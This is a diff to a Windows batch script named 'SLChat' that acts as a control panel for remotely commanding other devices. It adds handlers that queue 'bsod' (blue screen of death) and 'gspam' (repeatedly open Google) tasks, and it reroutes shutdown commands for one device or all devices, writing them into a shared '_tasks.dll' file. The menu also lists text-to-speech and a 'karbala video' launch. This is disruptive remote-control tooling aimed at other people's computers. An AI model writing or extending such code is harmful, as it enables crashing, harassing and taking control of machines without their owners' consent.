@@ -1,4 +1,4 @@
-::SLChat
+:: SLChat
 :: WRITTEN BY 1K0DE
 
 set "_localMode=true"
@@ -298,6 +298,7 @@ echo  ║ $bsod id/all --Triggers blue screen of death on the specific device   
 echo  ║ $gspam id/all --Spam opens google on the specific device                  ║
 echo  ║ $tts id/all TEXT --Text to speech on the specified device                 ║
 echo  ║ $karbala id/all --Launches special karbala video on the specified device  ║
+echo  ║ ------------------------------------------------------------------------- ║
 echo  ║ $checkactive id/all --Checks if the specific device is active             ║
 echo  ║ $FIX_COMMS --FIX/RESET ALL COMMS FILES INCASE OF ERROR                    ║
 echo  ║ $clear --Clears cmd window                                                ║
@@ -307,52 +308,6 @@ echo  ╚═══════════════════════�
 :: Clean up
 del temp.vbs
 goto :process_command_MM
-
-:Shutdown_Device
-setlocal
-
-::Parameters
-set "device_id=%~1"
-set "_delay=%~2"
-
-if "!device_id!" == "" (
-    echo.
-    %PRINT%{255;255;255}  :Shutdown_Device function error: device_id parameter not specified.\n
-    goto process_command_MM
-)
-
-if "!device_id!" == "all" (
-    if "!_delay!" == "" (
-        for /f "delims=" %%F in ('dir /b "!fullPath!\*"') do (
-            set "fileName=%%F"
-            ::echo "!fullPath!\!fileName!" --for debugging
-            echo sd_nodelay>>"!fullPath!\!fileName!\_tasks.dll"
-        )
-
-        ping localhost -n 2 > nul
-        goto process_command_MM
-    )
-
-    for /f "delims=" %%F in ('dir /b "!fullPath!\*"') do (
-        set "fileName=%%F"
-        echo sd_!_delay!>>"!fullPath!\!fileName!\_tasks.dll"
-    )
-
-    ping localhost -n 2 > nul
-    goto process_command_MM
-)
-
-if "!_delay!" == "" (
-    ::Shutdown individual device
-    echo sd_nodelay>>"!fullPath!\!device_id!\_tasks.dll"
-) else (
-    ::Shutdown individual device with delay
-    echo sd_!_delay!>>"!fullPath!\!device_id!\_tasks.dll"
-)
-goto process_command_MM
-
-endlocal
-goto :eof
 
 :EXECUTE_COMMAND
 setlocal
@@ -446,7 +401,8 @@ if "!arg_1!" == "$shutdown" (
             Call TypeWriter "  > Shutting down ALL ACTIVE DEVICES.." 15
             echo.
             
-            CALL :Shutdown_Device "all"
+            ::CALL :Shutdown_Device "all"
+            CALL :EXECUTE_COMMAND "shutdown" "all"
 
             echo.
             goto process_command_MM
@@ -458,7 +414,8 @@ if "!arg_1!" == "$shutdown" (
             Call TypeWriter "  > Shutting down ALL ACTIVE DEVICES with a DELAY of !_delay! seconds.." 15
             echo.
 
-            CALL :Shutdown_Device "all" !_delay!
+           :: CALL :Shutdown_Device "all" !_delay!
+           CALL :EXECUTE_COMMAND "shutdown" "all" !_delay!
 
             echo.
             goto process_command_MM
@@ -483,7 +440,8 @@ if "!arg_1!" == "$shutdown" (
         Call TypeWriter "  > Shutting down device: !arg_2!.." 15
         echo.
 
-        CALL :Shutdown_Device "!arg_2!"
+        ::CALL :Shutdown_Device "!arg_2!"
+        CALL :EXECUTE_COMMAND "shutdown" "!arg_2!"
 
         echo.
         goto process_command_MM
@@ -495,7 +453,8 @@ if "!arg_1!" == "$shutdown" (
         Call TypeWriter "  > Shutting down device: !arg_2! with a DELAY of !_delay! seconds.." 15
         echo.
 
-        CALL :Shutdown_Device "!arg_2!" !arg_3!
+        ::CALL :Shutdown_Device "!arg_2!" !arg_3!
+        CALL :EXECUTE_COMMAND "shutdown" "!arg_2!" !arg_3!
 
         echo.
         goto process_command_MM
@@ -503,6 +462,156 @@ if "!arg_1!" == "$shutdown" (
         ::arg3 IS NOT a number
         %PRINT%{255;255;255}  Invalid command usage, DELAY must be a number.\n
         %PRINT%{255;255;255}  Usage: $shutdown [DEVICE_ID: string] [DELAY: number]\n
+        goto process_command_MM
+    )
+)
+
+if "!arg_1!" == "$bsod" (
+    if "!arg_2!" == "" (
+        echo.
+        %PRINT%{255;255;255}  Invalid command usage, please specify the device id.\n
+        %PRINT%{255;255;255}  Usage: $bsod [DEVICE_ID: string] [DELAY: number]\n
+        goto process_command_MM
+    )
+
+    for /f "delims=" %%A in ('powershell -Command "[Console]::WriteLine('!arg_2!'.ToLower())"') do set "arg_2=%%A"
+    echo.
+
+    if "!arg_2!" == "all" (
+        if "!arg_3!" == "" (
+            Call TypeWriter "  > Triggered BSOD on ALL ACTIVE DEVICES.." 15
+            echo.
+            
+            CALL :EXECUTE_COMMAND "bsod" "all"
+
+            echo.
+            goto process_command_MM
+        )
+
+        set /a _delay=!arg_3! 2>nul
+        if "!_delay!" == "!arg_3!" (
+            ::arg3 IS a number
+            Call TypeWriter "  > Triggering BSOD on ALL ACTIVE DEVICES with a DELAY of !_delay! seconds.." 15
+            echo.
+
+           CALL :EXECUTE_COMMAND "bsod" "all" !_delay!
+
+            echo.
+            goto process_command_MM
+        ) else (
+            ::arg3 IS NOT a number
+            %PRINT%{255;255;255}  Invalid command usage, DELAY must be a number.\n
+            %PRINT%{255;255;255}  Usage: $bsod [DEVICE_ID: string] [DELAY: number]\n
+            goto process_command_MM
+        )
+    )
+
+    if not exist "!fullPath!\!arg_2!" (
+        Call TypeWriter "  > Device Id '!arg_2!' not found..." 15
+        echo.
+        goto process_command_MM
+    )
+
+
+    if "!arg_3!" == "" (
+        Call TypeWriter "  > Triggering BSOD on device: !arg_2!.." 15
+        echo.
+
+        CALL :EXECUTE_COMMAND "bsod" "!arg_2!"
+
+        echo.
+        goto process_command_MM
+    )
+    
+    set /a _delay=!arg_3! 2>nul
+    if "!_delay!" == "!arg_3!" (
+        ::arg3 IS a number
+        Call TypeWriter "  > Triggering BSOD on device: !arg_2! with a DELAY of !_delay! seconds.." 15
+        echo.
+
+        CALL :EXECUTE_COMMAND "bsod" "!arg_2!" !arg_3!
+
+        echo.
+        goto process_command_MM
+    ) else (
+        ::arg3 IS NOT a number
+        %PRINT%{255;255;255}  Invalid command usage, DELAY must be a number.\n
+        %PRINT%{255;255;255}  Usage: $bsod [DEVICE_ID: string] [DELAY: number]\n
+        goto process_command_MM
+    )
+)
+
+if "!arg_1!" == "$gspam" (
+    if "!arg_2!" == "" (
+        echo.
+        %PRINT%{255;255;255}  Invalid command usage, please specify the device id.\n
+        %PRINT%{255;255;255}  Usage: $gspam [DEVICE_ID: string] [DELAY: number]\n
+        goto process_command_MM
+    )
+
+    for /f "delims=" %%A in ('powershell -Command "[Console]::WriteLine('!arg_2!'.ToLower())"') do set "arg_2=%%A"
+    echo.
+
+    if "!arg_2!" == "all" (
+        if "!arg_3!" == "" (
+            Call TypeWriter "  > Triggered GOOGLE SPAM on ALL ACTIVE DEVICES.." 15
+            echo.
+            
+            CALL :EXECUTE_COMMAND "gspam" "all"
+
+            echo.
+            goto process_command_MM
+        )
+
+        set /a _delay=!arg_3! 2>nul
+        if "!_delay!" == "!arg_3!" (
+            ::arg3 IS a number
+            Call TypeWriter "  > Triggering GOOGLE SPAM on ALL ACTIVE DEVICES with a DELAY of !_delay! seconds.." 15
+            echo.
+
+           CALL :EXECUTE_COMMAND "gspam" "all" !_delay!
+
+            echo.
+            goto process_command_MM
+        ) else (
+            ::arg3 IS NOT a number
+            %PRINT%{255;255;255}  Invalid command usage, DELAY must be a number.\n
+            %PRINT%{255;255;255}  Usage: $gspam [DEVICE_ID: string] [DELAY: number]\n
+            goto process_command_MM
+        )
+    )
+
+    if not exist "!fullPath!\!arg_2!" (
+        Call TypeWriter "  > Device Id '!arg_2!' not found..." 15
+        echo.
+        goto process_command_MM
+    )
+
+
+    if "!arg_3!" == "" (
+        Call TypeWriter "  > Triggering GOOGLE SPAM on device: !arg_2!.." 15
+        echo.
+
+        CALL :EXECUTE_COMMAND "gspam" "!arg_2!"
+
+        echo.
+        goto process_command_MM
+    )
+    
+    set /a _delay=!arg_3! 2>nul
+    if "!_delay!" == "!arg_3!" (
+        ::arg3 IS a number
+        Call TypeWriter "  > Triggering GOOGLE SPAM on device: !arg_2! with a DELAY of !_delay! seconds.." 15
+        echo.
+
+        CALL :EXECUTE_COMMAND "gspam" "!arg_2!" !arg_3!
+
+        echo.
+        goto process_command_MM
+    ) else (
+        ::arg3 IS NOT a number
+        %PRINT%{255;255;255}  Invalid command usage, DELAY must be a number.\n
+        %PRINT%{255;255;255}  Usage: $gspam [DEVICE_ID: string] [DELAY: number]\n
         goto process_command_MM
     )
 )
